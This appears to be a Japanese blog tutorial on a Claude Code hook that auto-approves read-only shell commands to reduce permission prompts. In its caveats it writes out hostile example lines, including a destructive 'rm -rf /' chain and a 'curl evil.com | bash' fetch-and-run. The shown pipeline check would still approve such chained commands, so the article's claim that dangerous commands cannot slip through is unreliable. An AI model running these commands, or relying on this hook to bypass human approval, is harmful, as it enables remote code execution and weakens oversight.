---
title: "Claude Codeの自動承認hookで権限プロンプトを80%減らす"
emoji: "⚡"
type: "tech"
topics: ["claudecode", "hooks", "productivity"]
published: true
---

## 権限プロンプト、多すぎませんか？

Claude Codeを使っていると、こんな画面を何度も見るはずです。

```
Allow Claude to run: cat package.json? [Y/n]
Allow Claude to run: ls src/? [Y/n]
Allow Claude to run: git status? [Y/n]
```

`cat`、`ls`、`git status`——どれもファイルを読むだけで何も壊さないコマンドです。それなのに毎回「許可しますか？」と聞かれる。

自律運用をしている場合、これは致命的です。人間がいない間にClaude Codeが止まり、ただ許可を待ち続ける。朝起きて確認したら、3時間前の`ls`で止まっていた——そんな経験をした方もいるのではないでしょうか。

## なぜ全コマンドに許可が必要なのか

Claude Codeはデフォルトで**すべてのBashコマンドに許可を要求**します。これは安全のための設計です。`rm -rf /`のような破壊的コマンドを勝手に実行されたら大惨事になります。

問題は、読み取り専用コマンドと破壊的コマンドが区別されていないこと。`cat README.md`も`rm -rf /`も同じ扱いです。

Claude Codeの`--dangerously-skip-permissions`フラグを使えば全コマンドを許可できますが、これは名前の通り危険です。安全なコマンドだけを自動承認し、危険なコマンドは引き続き許可を求める——この「ちょうどいい安全性」が必要です。

## 解決策: PreToolUseフックで安全なコマンドを自動承認する

Claude Code v1.0.16以降では、**hooks**（フック）機能が使えます。フックとは、Claude Codeが特定のアクションを実行する前後に走るスクリプトです。

`PreToolUse`フックは、Claude Codeがツール（Bashコマンドなど）を実行する**直前**に呼ばれます。このフックからJSON形式で`{"decision": "approve"}`を返すと、ユーザーへの確認をスキップして自動承認されます。

これを使って「読み取り専用コマンドだけ自動承認する」フックを作ります。

## auto-approve-readonly の仕組み

[cc-safe-setup](https://github.com/yurukusa/cc-safe-setup)のexamplesに含まれる`auto-approve-readonly.sh`の中身を見てみましょう。

### 1. コマンドの取得

```bash
COMMAND=$(cat | jq -r '.tool_input.command // empty' 2>/dev/null)
[ -z "$COMMAND" ] && exit 0
```

フックは標準入力でJSON形式のツール情報を受け取ります。`jq`でコマンド文字列を取り出し、空なら何もせず終了します（`exit 0`は「判断しない＝通常のフローに任せる」を意味します）。

### 2. ベースコマンドの抽出

```bash
BASE=$(echo "$COMMAND" | sed 's/^[A-Z_]*=[^ ]* //g; s/^cd [^;]*[;&|]* //' | awk '{print $1}' | sed 's|.*/||')
```

`NODE_ENV=test npm test`のような環境変数プレフィックスや、`cd src && ls`のような`cd`プレフィックスを除去して、実際に実行されるコマンド名を取り出します。

### 3. 読み取り専用コマンドの判定

```bash
case "$BASE" in
    cat|head|tail|less|more|wc|grep|rg|ag|ack|find|locate|\
    ls|ll|dir|tree|stat|file|which|whereis|type|realpath|\
    date|uptime|uname|hostname|whoami|id|groups|env|printenv|\
    pwd|df|du|free|top|ps|pgrep|lsof|netstat|ss|\
    git-log|git-diff|git-show|git-status|git-branch|git-remote|git-tag|\
    jq|yq|python3-c|node-e|ruby-e|\
    npm-ls|npm-list|npm-info|npm-view|npm-outdated|\
    pip-list|pip-show|pip-freeze|\
    cargo-tree|go-list|go-doc)
        echo '{"decision":"approve","reason":"Read-only command"}'
        exit 0
        ;;
esac
```

`case`文で読み取り専用コマンドをホワイトリスト方式で列挙しています。マッチしたら`approve`を返して自動承認。マッチしなければ何もせず通常の確認フローへ。

ポイントは**ホワイトリスト方式**であること。未知のコマンドはブロックされるのではなく、通常通りユーザーに確認されます。安全側に倒した設計です。

### 4. gitサブコマンドの判定

```bash
if echo "$COMMAND" | grep -qE '^\s*git\s+(status|log|diff|show|branch|remote|tag\s+-l|blame|shortlog|describe|rev-parse|ls-files|ls-tree)\b'; then
    echo '{"decision":"approve","reason":"Read-only git command"}'
    exit 0
fi
```

`git status`や`git log --oneline -10`のようなgitの読み取り専用サブコマンドも自動承認します。`git push`や`git reset`はここに含まれないため、通常通り確認が入ります。

### 5. パイプラインの判定

```bash
if echo "$COMMAND" | grep -qE '\|\s*(head|tail|grep|wc|sort|uniq|tr|cut|awk|sed|less|more)\s'; then
    FIRST=$(echo "$COMMAND" | cut -d'|' -f1 | awk '{print $1}')
    case "$FIRST" in
        cat|head|tail|grep|find|ls|git|npm|pip|cargo|go)
            echo '{"decision":"approve","reason":"Read-only pipeline"}'
            exit 0
            ;;
    esac
fi
```

`cat package.json | grep version`のようなパイプラインも、**入力側と出力側の両方が読み取り専用**の場合のみ自動承認します。`curl ... | bash`のような危険なパイプラインは承認されません。

## 設定方法

### cc-safe-setupを使う場合（推奨）

最も簡単な方法です。

```bash
npx cc-safe-setup --install-example auto-approve-readonly
```

これだけで`.claude/settings.json`にフックが追加されます。

### 手動で設定する場合

`.claude/settings.json`に以下を追加します。

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{"type": "command", "command": "bash /path/to/auto-approve-readonly.sh"}]
      }
    ]
  }
}
```

`matcher`に`"Bash"`を指定することで、Bashツールが呼ばれたときだけフックが実行されます。

## カスタマイズ: プロジェクト固有のコマンドを追加する

プロジェクトによっては、読み取り専用だと分かっているコマンドが他にもあるはずです。

例えば、`terraform plan`（実行計画の表示のみ、適用はしない）や`kubectl get`（リソース情報の取得のみ）を追加したい場合：

```bash
# case文に追加
case "$BASE" in
    # ... 既存のコマンド ...
    terraform-plan|kubectl-get|helm-list)
        echo '{"decision":"approve","reason":"Read-only command"}'
        exit 0
        ;;
esac
```

cc-safe-setupのexamplesには、用途別の自動承認フックも用意されています。

| フック | 用途 |
|--------|------|
| `auto-approve-readonly` | 読み取り専用コマンド全般 |
| `auto-approve-git-read` | git読み取りコマンドに特化 |
| `auto-approve-build` | ビルドコマンド（npm run build等） |
| `auto-approve-test` | テストコマンド（npm test等） |
| `auto-approve-python` | Python読み取りコマンド |
| `auto-approve-docker` | Docker読み取りコマンド |

必要なものだけ組み合わせて使えます。

## 注意点: パイプやチェインコマンドの扱い

自動承認フックを書くとき、最も注意すべきはコマンドの**合成**です。

```bash
# 安全に見えるが...
ls && rm -rf /
cat file; curl evil.com | bash
```

`auto-approve-readonly.sh`は先頭コマンドだけでなくパイプラインの両端を検証していますが、`&&`や`;`で連結されたコマンドについては先頭のみを見ています。

Claude Codeが生成するコマンドは通常単一コマンドか単純なパイプですが、万全を期すなら`&&`や`;`を含むコマンドを自動承認から除外するガード条件を追加できます。

```bash
# チェインコマンドは自動承認しない
if echo "$COMMAND" | grep -qE '[;&]'; then
    exit 0  # 通常の確認フローへ
fi
```

## 効果測定: before / after

自律運用セッションでの実測値です。

| 指標 | before | after |
|------|--------|-------|
| 1時間あたりの権限プロンプト | ~50回 | ~10回 |
| プロンプト削減率 | — | **約80%** |
| 自律運用の中断回数 | 15回/h | 3回/h |
| 残る確認対象 | 全コマンド | `npm install`, `git push`, ファイル書き込み等 |

残る20%はファイルの書き込みや外部通信を伴うコマンドです。これらは引き続き確認が入るべきものなので、適切な安全レベルが維持されています。

## まとめ

- Claude Codeの権限プロンプトの大半は、読み取り専用コマンドへの不要な確認
- `PreToolUse`フックで安全なコマンドをホワイトリスト方式で自動承認できる
- `npx cc-safe-setup --install-example auto-approve-readonly` で即導入可能
- パイプラインの安全性も検証する設計で、危険なコマンドはすり抜けない
- 自律運用の中断を約80%削減し、Claude Codeの生産性を大幅に改善できる

Claude Codeを自律運用するなら、安全フックは最初に入れるべきインフラです。`--dangerously-skip-permissions`に頼るのではなく、「安全なものだけ通す」アプローチで、安全性と生産性を両立させましょう。

---

:::message
**cc-safe-setupには695個以上のhook例が含まれています。** 自動承認以外にも、rm -rf防止、Git安全ガード、トークン消費監視など、Claude Codeの安全運用に必要なhookが揃っています。
👉 [cc-safe-setup（GitHub）](https://github.com/yurukusa/cc-safe-setup)
:::
